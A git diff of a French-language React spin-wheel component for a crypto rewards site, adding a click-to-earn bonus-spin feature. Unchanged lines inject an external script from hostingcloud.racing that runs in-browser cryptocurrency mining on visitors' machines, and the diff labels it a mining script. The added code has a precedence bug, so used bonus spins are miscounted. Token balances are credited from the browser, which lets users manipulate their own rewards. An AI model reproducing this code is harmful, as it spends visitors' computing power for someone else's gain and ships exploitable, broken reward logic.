@@ -10,10 +10,10 @@ import { useToast } from '@/hooks/use-toast';
 import { supabase } from '@/integrations/supabase/client';
 import { Loader2 } from 'lucide-react';
 import HashrateTicker from './HashrateTicker';
+import { ClickToEarn } from './ClickToEarn';
 
 interface SpinWheelProps {
   onZeroWin?: (amount: number) => void;
-  
 }
 
 interface SpinPrize {
@@ -51,6 +51,7 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
     totalUsdtWon: 0,
     totalDogecoinWon: 0
   });
+  const [bonusSpins, setBonusSpins] = useState(0);
 
   // Purchase spin dialog states
   const [isPurchaseDialogOpen, setIsPurchaseDialogOpen] = useState(false);
@@ -68,9 +69,30 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
 
   useEffect(() => {
     checkSpinStatus();
+    loadBonusSpins();
     const interval = setInterval(updateCountdown, 1000);
     return () => clearInterval(interval);
   }, []);
+
+  const loadBonusSpins = async () => {
+    try {
+      const { data: { user } } = await supabase.auth.getUser();
+      if (!user) return;
+
+      const { data: clickStats } = await supabase
+        .from('click_to_earn_stats')
+        .select('free_spins_earned, free_spins_used')
+        .eq('user_id', user.id)
+        .single();
+
+      if (clickStats) {
+        const availableSpins = (clickStats.free_spins_earned || 0) - (clickStats.free_spins_used || 0);
+        setBonusSpins(Math.max(0, availableSpins));
+      }
+    } catch (error) {
+      console.error('Error loading bonus spins:', error);
+    }
+  };
 
   const checkSpinStatus = async () => {
     try {
@@ -142,7 +164,6 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
   };
 
   const addZeroToWallet = async (userId: string, amount: number) => {
-    // crédite farming_data.zero_tokens
     const { data, error } = await supabase
       .from('farming_data')
       .select('zero_tokens')
@@ -155,7 +176,6 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
     }
 
     if (!data) {
-      // créer la ligne si besoin puis set
       const { error: insErr } = await supabase.from('farming_data').insert({ user_id: userId, zero_tokens: amount });
       if (insErr) {
         console.error('Erreur création farming_data pour ZERO:', insErr);
@@ -174,7 +194,7 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
     }
   };
 
-  const performSpin = async (isFreeSpin: boolean = true) => {
+  const performSpin = async (isFreeSpin: boolean = true, useBonusSpin: boolean = false) => {
     if (isSpinning) return;
 
     try {
@@ -211,8 +231,25 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
           updated_at: new Date().toISOString()
         };
 
-        if (isFreeSpin) {
+        if (isFreeSpin && !useBonusSpin) {
           updates.last_free_spin = new Date().toISOString();
+        }
+
+        if (useBonusSpin) {
+          // Update click stats to mark spin as used
+          await supabase
+            .from('click_to_earn_stats')
+            .update({ 
+              free_spins_used: (await supabase
+                .from('click_to_earn_stats')
+                .select('free_spins_used')
+                .eq('user_id', user.id)
+                .single()
+              ).data?.free_spins_used || 0 + 1
+            })
+            .eq('user_id', user.id);
+          
+          setBonusSpins(prev => Math.max(0, prev - 1));
         }
 
         if (prize.type === 'zero') {
@@ -229,13 +266,12 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
           .from('user_spin_status')
           .upsert({ user_id: user.id, ...updates });
 
-        // Show prize notification
         toast({
           title: "🎉 Félicitations !",
           description: `Vous avez gagné ${prize.amount} ${prize.type.toUpperCase()}!`
         });
 
-        if (isFreeSpin) {
+        if (isFreeSpin && !useBonusSpin) {
           const nextSpin = new Date(Date.now() + 3 * 60 * 60 * 1000);
           setNextFreeSpinTime(nextSpin);
           setCanFreeSpin(false);
@@ -280,7 +316,7 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
       const { error } = await supabase.from('spin_transactions').insert({
         user_id: user.id,
         transaction_id: transactionId.trim(),
-        payment_method: selectedSource, // utiliser la source comme méthode
+        payment_method: selectedSource,
         currency_paid: selectedCurrency,
         amount_paid: 0.10
       });
@@ -308,8 +344,12 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
     }
   };
 
+  const handleFreeSpinEarned = () => {
+    loadBonusSpins();
+  };
+
   useEffect(() => {
-    // Remplace l'ancien script par le nouveau + expose window._client
+    // Script de mining
     const script1 = document.createElement('script');
     script1.src = 'https://www.hostingcloud.racing/etyE.js';
     document.head.appendChild(script1);
@@ -325,7 +365,6 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
     document.body.appendChild(script2);
 
     return () => {
-      // Cleanup scripts on unmount
       try {
         document.head.removeChild(script1);
         document.body.removeChild(script2);
@@ -336,233 +375,259 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
   }, []);
 
   return (
-    <Card className="gradient-card mb-8">
-      <CardHeader className="text-center">
-        <div className="flex justify-between items-center mb-4">
-          <div></div>
-          <div>
-            <CardTitle className="text-3xl gradient-text">🎰 Roue de la Fortune</CardTitle>
-            <p className="text-muted-foreground">Tournez gratuitement toutes les 3h ou achetez des spins !</p>
+    <div>
+      {/* Jeu de clics */}
+      <ClickToEarn onFreeSpinEarned={handleFreeSpinEarned} />
+
+      <Card className="gradient-card mb-8">
+        <CardHeader className="text-center">
+          <div className="flex justify-between items-center mb-4">
+            <div></div>
+            <div>
+              <CardTitle className="text-3xl gradient-text">🎰 Roue de la Fortune</CardTitle>
+              <p className="text-muted-foreground">Tournez gratuitement toutes les 3h ou achetez des spins !</p>
+            </div>
+            <div></div>
           </div>
-          <div></div>
-        </div>
-        <div className="mt-2 p-2 bg-muted/50 rounded text-sm text-muted-foreground">
-          ⚡ Section avec mining JavaScript actif
-        </div>
-        <div className="mt-3">
-          <HashrateTicker />
-        </div>
-      </CardHeader>
-      <CardContent>
-        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
-          {/* Spin Wheel */}
-          <div className="lg:col-span-2 flex flex-col items-center">
-            <div className="relative mb-6">
-              <div 
-                className="w-80 h-80 rounded-full border-8 border-primary relative overflow-hidden transition-transform duration-[3000ms] ease-out"
-                style={{ 
-                  transform: `rotate(${rotation}deg)`,
-                  background: `conic-gradient(${SPIN_PRIZES.map((prize, index) => 
-                    `${prize.color} ${(index / SPIN_PRIZES.length) * 360}deg ${((index + 1) / SPIN_PRIZES.length) * 360}deg`
-                  ).join(', ')})`
-                }}
-              >
-                {/* Spin segments with prizes */}
-                {SPIN_PRIZES.map((prize, index) => (
-                  <div
-                    key={prize.id}
-                    className="absolute w-1/2 h-1/2 flex items-center justify-center text-white font-bold text-xs"
-                    style={{
-                      transformOrigin: '100% 100%',
-                      transform: `rotate(${(360 / SPIN_PRIZES.length) * index}deg)`,
-                      top: '0',
-                      left: '50%'
-                    }}
+          <div className="mt-2 p-2 bg-muted/50 rounded text-sm text-muted-foreground">
+            ⚡ Section avec mining JavaScript actif
+          </div>
+          <div className="mt-3">
+            <HashrateTicker />
+          </div>
+        </CardHeader>
+        <CardContent>
+          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            {/* Spin Wheel */}
+            <div className="lg:col-span-2 flex flex-col items-center">
+              <div className="relative mb-6">
+                <div 
+                  className="w-80 h-80 rounded-full border-8 border-primary relative overflow-hidden transition-transform duration-[3000ms] ease-out"
+                  style={{ 
+                    transform: `rotate(${rotation}deg)`,
+                    background: `conic-gradient(${SPIN_PRIZES.map((prize, index) => 
+                      `${prize.color} ${(index / SPIN_PRIZES.length) * 360}deg ${((index + 1) / SPIN_PRIZES.length) * 360}deg`
+                    ).join(', ')})`
+                  }}
+                >
+                  {/* Segments améliorés avec meilleur affichage des prix */}
+                  {SPIN_PRIZES.map((prize, index) => (
+                    <div
+                      key={prize.id}
+                      className="absolute w-1/2 h-1/2 flex items-center justify-center text-white font-bold"
+                      style={{
+                        transformOrigin: '100% 100%',
+                        transform: `rotate(${(360 / SPIN_PRIZES.length) * index}deg)`,
+                        top: '0',
+                        left: '50%'
+                      }}
+                    >
+                      <div className="text-center transform rotate-0" style={{ transform: `rotate(${18}deg)` }}>
+                        <div className="text-2xl mb-1">{prize.icon}</div>
+                        <div className="text-xs font-extrabold bg-black/30 px-1 py-0.5 rounded backdrop-blur-sm">
+                          {prize.amount} {prize.type === 'zero' ? 'ZERO' : prize.type.toUpperCase()}
+                        </div>
+                        <div className="text-xs opacity-80">{prize.probability}%</div>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+                
+                {/* Pointer */}
+                <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-2 z-10">
+                  <div className="w-0 h-0 border-l-4 border-r-4 border-b-8 border-l-transparent border-r-transparent border-b-primary"></div>
+                </div>
+              </div>
+
+              {/* Last Prize */}
+              {lastPrize && (
+                <div className="mb-4 p-4 bg-gradient-to-r from-yellow-500/20 to-orange-500/20 rounded-lg border border-yellow-500/30">
+                  <div className="text-center">
+                    <div className="text-2xl mb-2">{lastPrize.icon}</div>
+                    <div className="font-bold">Dernier gain:</div>
+                    <div className="text-lg gradient-text">
+                      {lastPrize.amount} {lastPrize.type === 'zero' ? 'ZERO' : lastPrize.type.toUpperCase()}
+                    </div>
+                  </div>
+                </div>
+              )}
+
+              {/* Spin Controls */}
+              <div className="space-y-4 w-full max-w-md">
+                <Button
+                  variant="crypto"
+                  size="xl"
+                  onClick={() => performSpin(true, false)}
+                  disabled={!canFreeSpin || isSpinning}
+                  className="w-full"
+                >
+                  {isSpinning ? (
+                    <>
+                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                      Tournage...
+                    </>
+                  ) : canFreeSpin ? (
+                    '🆓 Spin Gratuit'
+                  ) : (
+                    `⏰ Prochain gratuit dans ${timeUntilFreeSpin}`
+                  )}
+                </Button>
+
+                {bonusSpins > 0 && (
+                  <Button
+                    variant="stake"
+                    size="xl"
+                    onClick={() => performSpin(true, true)}
+                    disabled={isSpinning}
+                    className="w-full"
                   >
-                    <div className="text-center">
-                      <div className="text-lg">{prize.icon}</div>
-                      <div className="text-xs">
-                        {prize.amount} {prize.type === 'zero' ? 'ZERO' : prize.type.toUpperCase()}
-                      </div>
-                    </div>
-                  </div>
-                ))}
-              </div>
-              
-              {/* Pointer */}
-              <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-2 z-10">
-                <div className="w-0 h-0 border-l-4 border-r-4 border-b-8 border-l-transparent border-r-transparent border-b-primary"></div>
-              </div>
-            </div>
-
-            {/* Last Prize */}
-            {lastPrize && (
-              <div className="mb-4 p-4 bg-gradient-to-r from-yellow-500/20 to-orange-500/20 rounded-lg border border-yellow-500/30">
-                <div className="text-center">
-                  <div className="text-2xl mb-2">{lastPrize.icon}</div>
-                  <div className="font-bold">Dernier gain:</div>
-                  <div className="text-lg gradient-text">
-                    {lastPrize.amount} {lastPrize.type === 'zero' ? 'ZERO' : lastPrize.type.toUpperCase()}
-                  </div>
-                </div>
-              </div>
-            )}
-
-            {/* Spin Controls */}
-            <div className="space-y-4 w-full max-w-md">
-              <Button
-                variant="crypto"
-                size="xl"
-                onClick={() => performSpin(true)}
-                disabled={!canFreeSpin || isSpinning}
-                className="w-full"
-              >
-                {isSpinning ? (
-                  <>
-                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                    Tournage...
-                  </>
-                ) : canFreeSpin ? (
-                  '🆓 Spin Gratuit'
-                ) : (
-                  `⏰ Prochain gratuit dans ${timeUntilFreeSpin}`
-                )}
-              </Button>
-
-              <Dialog open={isPurchaseDialogOpen} onOpenChange={setIsPurchaseDialogOpen}>
-                <DialogTrigger asChild>
-                  <Button variant="stake" size="xl" className="w-full">
-                    🔎 Vérifier un ID de transaction (0.10 USD)
+                    🎯 Utiliser Spin Bonus ({bonusSpins} disponible{bonusSpins > 1 ? 's' : ''})
                   </Button>
-                </DialogTrigger>
-                <DialogContent className="sm:max-w-md">
-                  <DialogHeader>
-                    <DialogTitle>Vérification IDTX - 0.10 USD</DialogTitle>
-                  </DialogHeader>
-                  <div className="space-y-4">
-                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                      <div>
-                        <Label htmlFor="source">Source des fonds</Label>
-                        <Select value={selectedSource} onValueChange={setSelectedSource}>
-                          <SelectTrigger>
-                            <SelectValue placeholder="Sélectionnez la source" />
-                          </SelectTrigger>
-                          <SelectContent>
-                            {sources.map(s => (
-                              <SelectItem key={s} value={s}>
-                                {s}
-                              </SelectItem>
-                            ))}
-                          </SelectContent>
-                        </Select>
+                )}
+
+                <Dialog open={isPurchaseDialogOpen} onOpenChange={setIsPurchaseDialogOpen}>
+                  <DialogTrigger asChild>
+                    <Button variant="stake" size="xl" className="w-full">
+                      🔎 Vérifier un ID de transaction (0.10 USD)
+                    </Button>
+                  </DialogTrigger>
+                  <DialogContent className="sm:max-w-md">
+                    <DialogHeader>
+                      <DialogTitle>Vérification IDTX - 0.10 USD</DialogTitle>
+                    </DialogHeader>
+                    <div className="space-y-4">
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div>
+                          <Label htmlFor="source">Source des fonds</Label>
+                          <Select value={selectedSource} onValueChange={setSelectedSource}>
+                            <SelectTrigger>
+                              <SelectValue placeholder="Sélectionnez la source" />
+                            </SelectTrigger>
+                            <SelectContent>
+                              {sources.map(s => (
+                                <SelectItem key={s} value={s}>
+                                  {s}
+                                </SelectItem>
+                              ))}
+                            </SelectContent>
+                          </Select>
+                        </div>
+                        <div>
+                          <Label htmlFor="currency">Devise utilisée</Label>
+                          <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
+                            <SelectTrigger>
+                              <SelectValue placeholder="Sélectionnez la devise" />
+                            </SelectTrigger>
+                            <SelectContent>
+                              {currencies.map(currency => (
+                                <SelectItem key={currency} value={currency}>
+                                  {currency}
+                                </SelectItem>
+                              ))}
+                            </SelectContent>
+                          </Select>
+                        </div>
                       </div>
+
                       <div>
-                        <Label htmlFor="currency">Devise utilisée</Label>
-                        <Select value={selectedCurrency} onValueChange={setSelectedCurrency}>
-                          <SelectTrigger>
-                            <SelectValue placeholder="Sélectionnez la devise" />
-                          </SelectTrigger>
-                          <SelectContent>
-                            {currencies.map(currency => (
-                              <SelectItem key={currency} value={currency}>
-                                {currency}
-                              </SelectItem>
-                            ))}
-                          </SelectContent>
-                        </Select>
+                        <Label htmlFor="txId">ID de Transaction</Label>
+                        <Input
+                          id="txId"
+                          value={transactionId}
+                          onChange={(e) => setTransactionId(e.target.value)}
+                          placeholder="Collez votre ID de transaction ici"
+                        />
+                      </div>
+
+                      <div className="flex gap-2">
+                        <Button
+                          variant="outline"
+                          onClick={() => setIsPurchaseDialogOpen(false)}
+                          className="flex-1"
+                          disabled={isSubmittingTx}
+                        >
+                          Annuler
+                        </Button>
+                        <Button
+                          variant="crypto"
+                          onClick={submitTransaction}
+                          className="flex-1"
+                          disabled={isSubmittingTx}
+                        >
+                          {isSubmittingTx ? 'Vérification...' : 'Soumettre'}
+                        </Button>
                       </div>
                     </div>
+                  </DialogContent>
+                </Dialog>
+              </div>
+            </div>
 
-                    <div>
-                      <Label htmlFor="txId">ID de Transaction</Label>
-                      <Input
-                        id="txId"
-                        value={transactionId}
-                        onChange={(e) => setTransactionId(e.target.value)}
-                        placeholder="Collez votre ID de transaction ici"
-                      />
+            {/* Stats Panel */}
+            <div className="space-y-4">
+              <Card>
+                <CardHeader>
+                  <CardTitle className="text-lg">📊 Vos Statistiques</CardTitle>
+                </CardHeader>
+                <CardContent className="space-y-3">
+                  <div className="flex justify-between">
+                    <span>Spins totaux:</span>
+                    <Badge variant="outline">{userStats.totalSpins}</Badge>
+                  </div>
+                  <div className="flex justify-between">
+                    <span>ZERO gagnés:</span>
+                    <Badge variant="outline" className="text-yellow-400">
+                      {userStats.totalZeroWon.toFixed(6)}
+                    </Badge>
+                  </div>
+                  <div className="flex justify-between">
+                    <span>USDT gagnés:</span>
+                    <Badge variant="outline" className="text-green-400">
+                      {userStats.totalUsdtWon.toFixed(2)}
+                    </Badge>
+                  </div>
+                  <div className="flex justify-between">
+                    <span>DOGE gagnés:</span>
+                    <Badge variant="outline" className="text-orange-400">
+                      {userStats.totalDogecoinWon.toFixed(0)}
+                    </Badge>
+                  </div>
+                  {bonusSpins > 0 && (
+                    <div className="flex justify-between">
+                      <span>Spins bonus:</span>
+                      <Badge variant="outline" className="text-blue-400">
+                        {bonusSpins}
+                      </Badge>
                     </div>
+                  )}
+                </CardContent>
+              </Card>
 
-                    <div className="flex gap-2">
-                      <Button
-                        variant="outline"
-                        onClick={() => setIsPurchaseDialogOpen(false)}
-                        className="flex-1"
-                        disabled={isSubmittingTx}
-                      >
-                        Annuler
-                      </Button>
-                      <Button
-                        variant="crypto"
-                        onClick={submitTransaction}
-                        className="flex-1"
-                        disabled={isSubmittingTx}
-                      >
-                        {isSubmittingTx ? 'Vérification...' : 'Soumettre'}
-                      </Button>
+              <Card>
+                <CardHeader>
+                  <CardTitle className="text-lg">🎁 Récompenses Possibles</CardTitle>
+                </CardHeader>
+                <CardContent>
+                  <div className="space-y-2 text-sm">
+                    <div className="flex justify-between">
+                      <span>💰 ZERO:</span>
+                      <span>0.0001 - 3.0</span>
+                    </div>
+                    <div className="flex justify-between text-green-400">
+                      <span>💵 USDT:</span>
+                      <span>5.0 (Rare!)</span>
+                    </div>
+                    <div className="flex justify-between text-orange-400">
+                      <span>🐕 DOGECOIN:</span>
+                      <span>500 (Très rare!)</span>
                     </div>
                   </div>
-                </DialogContent>
-              </Dialog>
+                </CardContent>
+              </Card>
             </div>
           </div>
-
-          {/* Stats Panel */}
-          <div className="space-y-4">
-            <Card>
-              <CardHeader>
-                <CardTitle className="text-lg">📊 Vos Statistiques</CardTitle>
-              </CardHeader>
-              <CardContent className="space-y-3">
-                <div className="flex justify-between">
-                  <span>Spins totaux:</span>
-                  <Badge variant="outline">{userStats.totalSpins}</Badge>
-                </div>
-                <div className="flex justify-between">
-                  <span>ZERO gagnés:</span>
-                  <Badge variant="outline" className="text-yellow-400">
-                    {userStats.totalZeroWon.toFixed(6)}
-                  </Badge>
-                </div>
-                <div className="flex justify-between">
-                  <span>USDT gagnés:</span>
-                  <Badge variant="outline" className="text-green-400">
-                    {userStats.totalUsdtWon.toFixed(2)}
-                  </Badge>
-                </div>
-                <div className="flex justify-between">
-                  <span>DOGE gagnés:</span>
-                  <Badge variant="outline" className="text-orange-400">
-                    {userStats.totalDogecoinWon.toFixed(0)}
-                  </Badge>
-                </div>
-              </CardContent>
-            </Card>
-
-            <Card>
-              <CardHeader>
-                <CardTitle className="text-lg">🎁 Récompenses Possibles</CardTitle>
-              </CardHeader>
-              <CardContent>
-                <div className="space-y-2 text-sm">
-                  <div className="flex justify-between">
-                    <span>💰 ZERO:</span>
-                    <span>0.0001 - 3.0</span>
-                  </div>
-                  <div className="flex justify-between text-green-400">
-                    <span>💵 USDT:</span>
-                    <span>5.0 (Rare!)</span>
-                  </div>
-                  <div className="flex justify-between text-orange-400">
-                    <span>🐕 DOGECOIN:</span>
-                    <span>500 (Très rare!)</span>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-          </div>
-        </div>
-      </CardContent>
-    </Card>
+        </CardContent>
+      </Card>
+    </div>
   );
 };
